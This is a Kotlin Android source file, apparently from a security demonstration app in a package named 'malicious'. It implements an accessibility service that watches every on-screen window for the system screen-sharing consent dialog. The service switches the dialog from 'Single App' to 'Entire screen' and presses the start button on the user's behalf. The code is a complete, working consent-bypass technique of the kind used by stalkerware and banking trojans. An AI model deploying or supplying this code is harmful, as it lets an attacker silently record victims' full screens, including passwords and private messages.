package com.example.sitconnect.securitydemo.malicious

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoClickerService : AccessibilityService() {

    private var lastDropdownClickTime: Long = 0
    private val DROPDOWN_COOLDOWN_MS = 500L // Reduced from 2000L to 500L for faster retry

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("AutoClickerService", "Accessibility Service Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            // New Strategy: Aggregate Findings from ALL Windows to avoid missing the popup or background elements.
            val findings = Findings()
            
            val windows = windows
            if (windows != null && windows.isNotEmpty()) {
                // Determine finding from all interactable windows
                for (window in windows) {
                    val root = window.root
                    if (root != null) {
                        scanTree(root, findings)
                    }
                }
            } else {
                // Fallback if windows API returns nothing
                val root = rootInActiveWindow
                if (root != null) {
                     scanTree(root, findings)
                }
            }
            
            actOnFindings(findings)
            
        } catch (e: Exception) {
            Log.e("AutoClickerService", "Error processing accessibility event", e)
        }
    }

    private class Findings {
        var singleAppNode: AccessibilityNodeInfo? = null
        var entireScreenNode: AccessibilityNodeInfo? = null
        var startButtonNode: AccessibilityNodeInfo? = null
    }

    private fun scanTree(root: AccessibilityNodeInfo, findings: Findings) {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        
        // Iterative BFS traversal to prevent StackOverflow on deep trees
        while (!queue.isEmpty()) {
            val node = queue.removeFirst()
            
            val text = node.text?.toString()?.trim() ?: ""
            if (text.isNotEmpty()) {
                 val lowerText = text.lowercase()
                 
                 // Detect "Single App" / "Share one app"
                 if (findings.singleAppNode == null && 
                     (lowerText.contains("a single app") || 
                     lowerText.contains("single app") ||
                     lowerText.contains("share one app") || 
                     lowerText == "one app")) {
                     if (isClickableOrHasClickableParent(node)) {
                         findings.singleAppNode = node
                     }
                 }
    
                 // Detect "Entire screen"
                 if (findings.entireScreenNode == null && lowerText.contains("entire screen")) {
                     if (isClickableOrHasClickableParent(node)) {
                         findings.entireScreenNode = node
                     }
                 }
    
                 // Detect Start Button
                 if (findings.startButtonNode == null && 
                     (lowerText == "start now" || 
                     lowerText == "start recording" || 
                     lowerText == "start casting" || 
                     lowerText == "start" || 
                     lowerText == "next" ||
                     lowerText == "share screen" ||
                     (text.length < 40 && (lowerText.contains("start now") || lowerText.contains("start recording")))) ) {
                     
                     if (isClickableOrHasClickableParent(node)) {
                         findings.startButtonNode = node
                     }
                 }
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    queue.add(child)
                }
            }
        }
    }

    private fun actOnFindings(findings: Findings) {
        val singleAppNode = findings.singleAppNode
        val entireScreenNode = findings.entireScreenNode
        val startButtonNode = findings.startButtonNode

        // Priority 1: Select "Entire Screen" from the dropdown.
        // Condition: We see "Entire Screen" AND we see "Single App".
        // This combination strongly implies the dropdown list is open and both options are visible.
        // We also check !isSpinner as a safety (though headers are often generic views now).
        if (entireScreenNode != null && singleAppNode != null) {
             Log.d("AutoClickerService", "Logic: Dropdown open (Both options visible). Selecting 'Entire Screen'.")
             if (performClick(entireScreenNode, "Select Entire Screen")) return
        }
        
        // Strict Fallback for Priority 1:
        // If "Entire Screen" is NOT a Spinner but we didn't see "Single App" (maybe it's scrolled off?), 
        // we might still want to click it. But we must be careful not to click the Header.
        // If "Entire Screen" is present and "Single App" is NOT, we assume it's the header (Step 3).
        // So we do NOTHING here.

        // Priority 2: Open the "Single App" dropdown.
        // Condition: We see "Single App" BUT we do NOT see "Entire Screen".
        // This implies the dropdown is closed and defaulting to Single App.
        if (singleAppNode != null && entireScreenNode == null) {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastDropdownClickTime > DROPDOWN_COOLDOWN_MS) {
                Log.d("AutoClickerService", "Logic: 'Single App' detected (Dropdown closed). Opening dropdown.")
                lastDropdownClickTime = currentTime 
                if (performClick(singleAppNode, "Change from Single App")) return
            } else {
                 // Log.d("AutoClickerService", "Logic: Cooldown active for dropdown.")
            }
            // Block Start click while waiting/finding Single App
            return
        }

        // Priority 3: Confirm / Click Start.
        // Condition: We do NOT see "Single App".
        // This implies we are either set to "Entire Screen" (header) or "Single App" is invisible.
        // We proceed to click Start.
        if (singleAppNode == null && startButtonNode != null) {
            Log.d("AutoClickerService", "Logic: 'Single App' NOT detected. 'Start' button detected. Clicking.")
            performClick(startButtonNode, "Start Button")
        }
    }

    private fun isClickableOrHasClickableParent(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable) return true
        var parent = node.parent
        while (parent != null) {
            if (parent.isClickable) return true
            parent = parent.parent
        }
        return false
    }

    private fun performClick(nodeInfo: AccessibilityNodeInfo, tag: String): Boolean {
        if (nodeInfo.isClickable) {
            nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.d("AutoClickerService", "Clicked $tag ('${nodeInfo.text}')")
            return true
        } else {
            var parent = nodeInfo.parent
            while (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d("AutoClickerService", "Clicked parent of $tag ('${nodeInfo.text}')")
                    return true
                }
                parent = parent.parent
            }
        }
        return false
    }

    override fun onInterrupt() {
        Log.d("AutoClickerService", "Service Interrupted")
    }
}